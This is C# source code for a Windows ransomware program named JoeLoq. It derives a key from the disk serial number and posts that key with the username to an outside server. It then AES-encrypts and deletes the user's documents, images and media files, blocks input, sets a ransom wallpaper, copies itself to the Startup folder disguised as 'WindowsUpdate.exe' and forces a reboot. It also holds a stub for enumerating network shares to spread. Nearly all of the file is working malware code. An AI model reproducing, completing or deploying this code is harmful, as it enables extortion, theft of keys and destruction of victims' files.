using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Management;

namespace JoeLoq
{
    public partial class FrmMain : Form
    {
        string[] filetypes = { "*.xls", "*.xlsx", "*.doc", "*.docx", "*.ppt", "*.pptx", "*.jpg", "*.jpeg", "*.png", "*.gif", "*.mp4", "*.mp3",
                             "*.avi", "*.mkv", "*.m4a", "*.webm", "*.csv", "*.pdf"};
        string[] temp;
        public FrmMain()
        {
            InitializeComponent();
        }
        private static string fileToLocate = null;
        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        [DllImport("user32.dll")]
        private static extern int ExitWindowsEx(int uFlags, int dwReason);

        public enum Style : int
        {
            Tiled = 0,
            Centered = 1,
            Stretched = 2,
            Fit = 6,
            Fill = 10,
            Span = 22
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true,
            CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public static extern bool LookupPrivilegeValue(string lpSystemName,
            string lpName,
            out long lpLuid);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            public long Luid;
            public int Attributes;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,
            bool DisableAllPrivileges,
            ref TOKEN_PRIVILEGES NewState,
            int BufferLength,
            IntPtr PreviousState,
            IntPtr ReturnLength);
        private string[] spreadcheese()
        {
            int x = 0;
            string compname = "\\" + Environment.MachineName;
            using (ManagementClass shares = new ManagementClass(compname + "\\root\\cimv2", "Win32_Share", new ObjectGetOptions()))
            {
                foreach (ManagementObject share in shares.GetInstances())
                {
                    temp[x] = share["Name"].ToString();
                    x++;
                }
                return temp; // fill buffer
            }
        }
        private void rebootmachine()
        {
            File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, Environment.SpecialFolder.CommonStartup + "\\WindowsUpdate.exe");
            AdjustToken(); // get privs
            ExitWindowsEx(0x00000002 | 0x00000004 | 0x00000010, 0x00000000); // now reboot
        }
        private void PostBootMsg()
        {
            BlockInput(true);
            Bitmap bmp = new Bitmap(pb1.BackgroundImage);
            var path = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "newbg.png");
            bmp.Save(path);
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            worker.RunWorkerAsync();
        }
        private void getFilesRecursive(string sDir, string pass, string pattern)
        {
            try
            {
                foreach (string d in Directory.GetDirectories(sDir,pattern))
                {
                    getFilesRecursive(d, pass, pattern);
                }
                foreach (var file in Directory.GetFiles(sDir,pattern,SearchOption.AllDirectories))
                {
                    EncryptFile(file,file + "_loq",pass).Wait();
                    File.Delete(file);
                }
            }
            catch (System.Exception)
            {
               // Access denied exception, fuck it continue
                
            }
        }
        private void tm_Tick(object sender, EventArgs e)
        {
            System.Net.WebClient wc = new System.Net.WebClient();
            string IPaddr = wc.DownloadString("https://hda.io/whatsmyip.php");
        }
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
        public static string HttpPost(string URI, string Parameters)
        {
            System.Net.WebRequest req = System.Net.WebRequest.Create(URI);
           // req.Proxy = new System.Net.WebProxy(ProxyString, true);
            req.ContentType = "application/x-www-form-urlencoded";
            req.Method = "POST";
            byte[] bytes = System.Text.Encoding.ASCII.GetBytes(Parameters);
            req.ContentLength = bytes.Length;
            System.IO.Stream os = req.GetRequestStream();
            os.Write(bytes, 0, bytes.Length); 
            os.Close();
            System.Net.WebResponse resp = req.GetResponse();
            if (resp == null) return null;
            System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
            return sr.ReadToEnd().Trim();
        }
        public static void AdjustToken()
        {
            if (Environment.OSVersion.Platform != PlatformID.Win32NT)
                return;
            const uint TOKEN_ADJUST_PRIVILEGES = 0x20;
            const uint TOKEN_QUERY = 0x8;
            const int SE_PRIVILEGE_ENABLED = 0x2;
            const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
            IntPtr tokenHandle;
            var procHandle = GetCurrentProcess();
            OpenProcessToken(procHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle);
            var tp = new TOKEN_PRIVILEGES();
            tp.Attributes = SE_PRIVILEGE_ENABLED;
            tp.PrivilegeCount = 1;
            LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, out tp.Luid);
            AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        }
        private async static Task EncryptFile(string inputFilename, string outputFilename, string password)
        {
            var buffer = new byte[1024 * 1024 * 1];
            var sha256 = SHA256.Create();
            var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));

            using (FileStream input = new FileStream(inputFilename, FileMode.Open, FileAccess.Read, FileShare.None))
            {
                using (FileStream outputRaw = new FileStream(outputFilename, FileMode.CreateNew, FileAccess.Write, FileShare.None))
                {
                    var aes = Aes.Create();
                    var iv = aes.IV;
                    var encryptor = aes.CreateEncryptor(hash, iv);
                    BinaryWriter bw = new BinaryWriter(outputRaw);
                    bw.Write(iv.Length);
                    bw.Write(iv);
                    bw.Flush();
                    int bytesRead;
                    using (var output = new CryptoStream(outputRaw, encryptor, CryptoStreamMode.Write))
                    {
                        do
                        {
                            bytesRead = await input.ReadAsync(buffer, 0, buffer.Length);
                            if (bytesRead > 0)
                            {
                                await output.WriteAsync(buffer, 0, bytesRead);
                            }
                        }
                        while (bytesRead > 0);
                    }
                }
            }
        }
        private async static Task DecryptFile(string inputFilename, string outputFilename, string password)
        {
            var buffer = new byte[1024 * 1024 * 1];
            var sha256 = SHA256.Create();
            var hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(password));
            using (FileStream inputRaw = new FileStream(inputFilename, FileMode.Open, FileAccess.Read, FileShare.None))
            {
                BinaryReader br = new BinaryReader(inputRaw);
                var ivl = br.ReadInt32();
                var iv = br.ReadBytes(ivl);
                using (FileStream output = new FileStream(outputFilename, FileMode.CreateNew, FileAccess.Write, FileShare.None))
                {
                    var aes = Aes.Create();
                    var decryptor = aes.CreateDecryptor(hash, iv);
                    using (var input = new CryptoStream(inputRaw, decryptor, CryptoStreamMode.Read))
                    {
                        int bytesRead;
                        do
                        {
                            bytesRead = await input.ReadAsync(buffer, 0, buffer.Length);
                            if (bytesRead > 0)
                            {
                                await output.WriteAsync(buffer, 0, bytesRead);
                            }
                        }
                        while (bytesRead > 0);
                    }
                }
            }
        }

        private void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            // Find every file in the current user's folder
            // encrypt with key
            ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + "C" + ":\"");
            disk.Get();
            string serial = disk["VolumeSerialNumber"].ToString();
            MD5 md5 = MD5.Create();
            string cryptokey = "";
            byte[] joelo = md5.ComputeHash(System.Text.Encoding.UTF8.GetBytes(serial));
            int i;
            for (i = 0; i < joelo.Length; i++)
            {
                cryptokey += String.Format("{0:X2}", joelo[i]);
            }
            HttpPost("http://hda.io/coldcuts.php", "derpderp=" + Base64Encode(cryptokey) + "&mensroom=" + Base64Encode(Environment.UserName));
            // Send home

            foreach (string pat in filetypes)
            {
                getFilesRecursive(Environment.SpecialFolder.UserProfile.ToString(), cryptokey, pat);
            }
            PostBootMsg();
            rebootmachine();
        }
    }
}
